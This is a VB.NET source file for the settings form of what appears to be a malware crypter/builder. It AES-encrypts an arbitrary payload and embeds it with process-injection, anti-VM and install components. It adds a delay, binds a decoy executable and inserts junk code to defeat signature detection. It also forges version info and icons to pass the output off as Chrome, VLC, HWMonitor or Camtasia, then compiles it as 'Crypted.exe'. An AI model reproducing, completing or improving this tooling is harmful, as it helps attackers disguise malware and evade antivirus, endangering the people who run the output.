Imports System.CodeDom.Compiler
Imports System.Security.Cryptography
Imports System.Text
Imports Toolbelt.Drawing

Public Class Form2

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles Me.Load
        txtInjection.SelectedIndex = 0
        txtExeFolder.SelectedIndex = 0
        txtUSG.SelectedIndex = 1
        txtStub.SelectedIndex = 1
    End Sub


    Private Sub Form2_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub

    Private Sub btnReturn_Click(sender As Object, e As EventArgs) Handles btnReturn.Click
        Me.Hide()
    End Sub

#Region "Bind"

    Private Sub HuraButton1_Click(sender As Object, e As EventArgs) Handles HuraButton1.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            txtBind.Text = o.FileName
        End If
    End Sub

#End Region

#Region "Helper"

    Public Shared rand As New Random()
    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "顾氏家族的成泽是顾商城公司的首席执行官顾太太希望她的生物孙"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Public Function AESEncrypt(ByVal input As Byte(), ByVal Pass As String) As Byte()
        Dim AES As RijndaelManaged = New RijndaelManaged()
        Dim hash As Byte() = New Byte(31) {}
        Dim temp As Byte() = New MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = CipherMode.ECB
        Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor()
        Return DESEncrypter.TransformFinalBlock(input, 0, input.Length)
    End Function

#End Region

#Region "Install"
    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
        On Error Resume Next
        If chkInstall.Checked Then
            chkInstall.Text = "ON"
            txtExeName.Enabled = True
            txtExeFolder.Enabled = True
            btnRandomExeName.Enabled = True

        Else
            chkInstall.Text = "OFF"
            txtExeName.Enabled = False
            txtExeFolder.Enabled = False
            btnRandomExeName.Enabled = False

        End If
    End Sub

    Private Sub btnRandomExeName_Click(sender As Object, e As EventArgs) Handles btnRandomExeName.Click
        Try
            txtExeName.Text = Randomi(rand.Next(4, 10)) + ".exe"
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

#End Region

#Region "Assembly"

    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        If chkAssembly.Checked Then
            chkAssembly.Text = "ON"
            txtAssemblyTitle.Enabled = True
            txtAssemblyDescription.Enabled = True
            txtAssemblyProduct.Enabled = True
            txtAssemblyCompany.Enabled = True
            txtAssemblyCopyright.Enabled = True
            txtAssemblyTrademark.Enabled = True
            txtAssemblyv1.Enabled = True
            txtAssemblyv2.Enabled = True
            txtAssemblyv3.Enabled = True
            txtAssemblyv4.Enabled = True

        Else
            chkAssembly.Text = "OFF"
            txtAssemblyTitle.Enabled = False
            txtAssemblyDescription.Enabled = False
            txtAssemblyProduct.Enabled = False
            txtAssemblyCompany.Enabled = False
            txtAssemblyCopyright.Enabled = False
            txtAssemblyTrademark.Enabled = False
            txtAssemblyv1.Enabled = False
            txtAssemblyv2.Enabled = False
            txtAssemblyv3.Enabled = False
            txtAssemblyv4.Enabled = False
        End If
    End Sub

    Private Sub btnAssemblyRandom_Click(sender As Object, e As EventArgs) Handles btnAssemblyRandom.Click
        Try
            Select Case rand.Next(6)
                Case 0
                    txtAssemblyTitle.Text = "chrome_exe"
                    txtAssemblyDescription.Text = "Google Chrome"
                    txtAssemblyProduct.Text = "Google Chrome"
                    txtAssemblyCompany.Text = "Google Inc."
                    txtAssemblyCopyright.Text = "Copyright 2017 Google Inc. All rights reserved."
                    txtAssemblyTrademark.Text = ""
                    txtAssemblyv1.Text = "67"
                    txtAssemblyv2.Text = "0"
                    txtAssemblyv3.Text = "3396"
                    txtAssemblyv4.Text = "99"

                Case 1
                    txtAssemblyTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtAssemblyDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtAssemblyProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtAssemblyCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtAssemblyCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtAssemblyTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtAssemblyv1.Text = rand.Next(0, 10)
                    txtAssemblyv2.Text = rand.Next(0, 10)
                    txtAssemblyv3.Text = rand.Next(0, 10)
                    txtAssemblyv4.Text = rand.Next(0, 10)

                Case 2
                    txtAssemblyTitle.Text = "vlc"
                    txtAssemblyDescription.Text = "VLC media player"
                    txtAssemblyProduct.Text = "VLC media player"
                    txtAssemblyCompany.Text = "VideoLAN"
                    txtAssemblyCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors"
                    txtAssemblyTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN"
                    txtAssemblyv1.Text = "3"
                    txtAssemblyv2.Text = "0"
                    txtAssemblyv3.Text = "3"
                    txtAssemblyv4.Text = "0"

                Case 3
                    txtAssemblyTitle.Text = "HWMonitor.exe"
                    txtAssemblyDescription.Text = "HWMonitor"
                    txtAssemblyProduct.Text = "CPUID Hardware Monitor"
                    txtAssemblyCompany.Text = "CPUID"
                    txtAssemblyCopyright.Text = "(c)2008-2018 CPUID.  All rights reserved."
                    txtAssemblyTrademark.Text = ""
                    txtAssemblyv1.Text = "1"
                    txtAssemblyv2.Text = "3"
                    txtAssemblyv3.Text = "4"
                    txtAssemblyv4.Text = "0"

                Case 4
                    txtAssemblyTitle.Text = "CamtasiaStudio.exe"
                    txtAssemblyDescription.Text = "TechSmith Camtasia 2018"
                    txtAssemblyProduct.Text = "Camtasia"
                    txtAssemblyCompany.Text = "TechSmith Corporation"
                    txtAssemblyCopyright.Text = "Copyright © 2011-2018 TechSmith Corporation. All rights reserved."
                    txtAssemblyTrademark.Text = "18"
                    txtAssemblyv1.Text = "0"
                    txtAssemblyv2.Text = "0"
                    txtAssemblyv3.Text = "31"
                    txtAssemblyv4.Text = "0"

                Case 5
                    txtAssemblyTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtAssemblyDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtAssemblyProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtAssemblyCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtAssemblyCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtAssemblyTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtAssemblyv1.Text = rand.Next(0, 10)
                    txtAssemblyv2.Text = rand.Next(0, 10)
                    txtAssemblyv3.Text = rand.Next(0, 10)
                    txtAssemblyv4.Text = rand.Next(0, 10)

            End Select
        Catch : End Try
    End Sub

    Private Sub btnAssemblyClone_Click(sender As Object, e As EventArgs) Handles btnAssemblyClone.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtAssemblyTitle.Text = info.InternalName
                txtAssemblyDescription.Text = info.FileDescription
                txtAssemblyProduct.Text = info.CompanyName
                txtAssemblyCompany.Text = info.ProductName
                txtAssemblyCopyright.Text = info.LegalCopyright
                txtAssemblyTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If

            Try
                txtAssemblyv1.Text = version(0)
                txtAssemblyv2.Text = version(1)
                txtAssemblyv3.Text = version(2)
                txtAssemblyv4.Text = version(3)
            Catch ex2 As Exception
            End Try
        End If
    End Sub

    Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
        If chkIcon.Checked Then
            chkIcon.Text = "ON"
            btnIcon.Enabled = True
            picIcon.Enabled = True

        Else
            chkIcon.Text = "OFF"
            btnIcon.Enabled = False
            picIcon.Enabled = False
        End If
    End Sub

    Private Sub btnIcon_Click(sender As Object, e As EventArgs) Handles btnIcon.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Icon |*.ico;*.exe"
            If o.ShowDialog = DialogResult.OK Then
                If o.FileName.EndsWith(".exe") Then
                    picIcon.ImageLocation = GetIcon(o.FileName)
                Else
                    picIcon.ImageLocation = o.FileName
                End If
            Else
                chkIcon.Checked = False
                btnIcon.Enabled = False
                picIcon.Enabled = False
                '  picIcon.Image = My.Resources.nyan
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Public Shared Function GetIcon(P As String) As String

        Try
            Using s As New IO.FileStream(IO.Path.GetTempPath + "\" + IO.Path.GetFileName(P), IO.FileMode.Create)
                IconExtractor.Extract1stIconTo(P, s)
            End Using
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
        Return IO.Path.GetTempPath + "\" + IO.Path.GetFileName(P)
    End Function


#End Region

#Region "Build"
    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
            Dim Loader As String = My.Resources.Loader
            txtLog.Text = txtLog.Text.Insert(0, "Creating Encryption Key..." + vbNewLine)
            Dim AESkey As String = Randomi(8)
            Loader = Replace(Loader, "#KEY", AESkey)

            'Install
            If chkInstall.Checked Then
                txtLog.Text.Insert(0, "Install..." + vbNewLine)
                Loader = Replace(Loader, "'@INS", Nothing)
                Loader = Replace(Loader, "#PATH", txtExeFolder.Text)
                Loader = Replace(Loader, "#EXE", "\" + txtExeName.Text)
            End If

            'Injection
            Dim inject As String = ""
            txtLog.Text = txtLog.Text.Insert(0, "Injecting..." + vbNewLine)
            If txtInjection.Text = "Itself" Then
                inject = "Application.ExecutablePath"
            Else
                inject = Chr(34) + Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + txtInjection.Text + ".exe" + Chr(34)
            End If
            Loader = Replace(Loader, "#INJECT", inject)

            'Delay
            If chkDelay.Checked Then
                txtLog.Text = txtLog.Text.Insert(0, "Adding Delay..." + vbNewLine)
                Loader = Replace(Loader, "'@DELAY", Nothing)
                Loader = Replace(Loader, "#DELAY", txtDelay.Text)
            End If

            'Anti Vm
            If chkAntiVM.Checked Then
                txtLog.Text = txtLog.Text.Insert(0, "Activate Anti VM..." + vbNewLine)
                Loader = Replace(Loader, "'@VM", Nothing)
            End If

            'Assembly
            If chkAssembly.Checked Then
                txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly..." + vbNewLine)
                Loader = Replace(Loader, "'%ASSEMBLY%", Nothing)
                Loader = Replace(Loader, "%Title%", txtAssemblyTitle.Text)
                Loader = Replace(Loader, "%Description%", txtAssemblyDescription.Text)
                Loader = Replace(Loader, "%Company%", txtAssemblyCompany.Text)
                Loader = Replace(Loader, "%Product%", txtAssemblyProduct.Text)
                Loader = Replace(Loader, "%Copyright%", txtAssemblyCopyright.Text)
                Loader = Replace(Loader, "%Trademark%", txtAssemblyTrademark.Text)
                Loader = Replace(Loader, "%v1%", txtAssemblyv1.Text)
                Loader = Replace(Loader, "%v2%", txtAssemblyv2.Text)
                Loader = Replace(Loader, "%v3%", txtAssemblyv3.Text)
                Loader = Replace(Loader, "%v4%", txtAssemblyv4.Text)
                Loader = Replace(Loader, "%Guid%", Guid.NewGuid.ToString)
            End If

            'Junke methods
            Loader = Replace(Loader, "%JUNK1%", GenerateJunk(RandomNumber(1, 2)))
            Loader = Replace(Loader, "%JUNK2%", GenerateJunk(RandomNumber(1, 2)))

            'Junk Class
            Loader = Replace(Loader, "%JUNK3%", GenerateJunkClass(RandomNumber(1, 2)))
            Loader = Replace(Loader, "%JUNK4%", GenerateJunkClass(RandomNumber(1, 2)))

            'Creating files
            txtLog.Text = txtLog.Text.Insert(0, "Creating DLLs" + vbNewLine)
            Dim ResName As String = Randomi(rand.Next(4, 10))
            Dim ResPayload As String = Randomi(rand.Next(4, 10))
            Dim ResINS As String = Randomi(rand.Next(4, 10))
            Dim ResVM As String = Randomi(rand.Next(4, 10))
            Dim ResPE As String = Randomi(rand.Next(4, 10))
            Dim ResBIND As String = Randomi(rand.Next(4, 10))

            Loader = Replace(Loader, "#PEdll", ResPE)
            Loader = Replace(Loader, "#PAYLOAD", ResPayload)
            Loader = Replace(Loader, "#VMdll", ResVM)
            Loader = Replace(Loader, "#INSdll", ResINS)
            Loader = Replace(Loader, "#ResName", ResName)

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources")
                R.AddResource(ResPayload, AESEncrypt((IO.File.ReadAllBytes(Form1.txtPayload.Text)), AESkey))
                R.AddResource(ResPE, AESEncrypt((My.Resources.PE), AESkey))

                If chkAntiVM.Checked = True Then
                    R.AddResource(ResVM, AESEncrypt((My.Resources.VM), AESkey))
                End If

                If chkInstall.Checked Then
                    R.AddResource(ResINS, AESEncrypt((My.Resources.INS), AESkey))
                End If

                If txtBind.Text <> "" Then
                    R.AddResource(ResBIND, AESEncrypt((IO.File.ReadAllBytes(txtBind.Text)), AESkey))
                    Loader = Replace(Loader, "'@BIND", Nothing)
                    Loader = Replace(Loader, "#BINDdll", ResBIND)
                    If chkBindOnce.Checked Then
                        Loader = Replace(Loader, "'@ONCE", Nothing)
                        Loader = Replace(Loader, "#ONCE", Randomi(rand.Next(4, 10)))
                    End If
                End If

                R.Generate()
            End Using



            If Compile(ResName, "Crypted", Loader) Then

                'Icon
                If chkIcon.Checked Then
                    IconInjector.InjectIcon("Crypted.exe", picIcon.ImageLocation)
                End If

                'Renamer
                Renamer.Mono("Crypted.exe")
                txtLog.Text = txtLog.Text.Insert(0, "Done!!" + vbNewLine)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try

    End Sub

    Private Function Compile(ByVal ResName As String, ByVal Path As String, ByVal Code As String) As Boolean
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            .ReferencedAssemblies.Add("System.Reflection.dll")
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + ResName + ".Resources")

            'Check for errors
            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
                    Exit For
                Next
                Return False

            Else
                IO.File.Delete(IO.Path.GetTempPath & "\" + ResName + ".Resources")
                Return True
            End If
        End With

    End Function




#End Region

End Class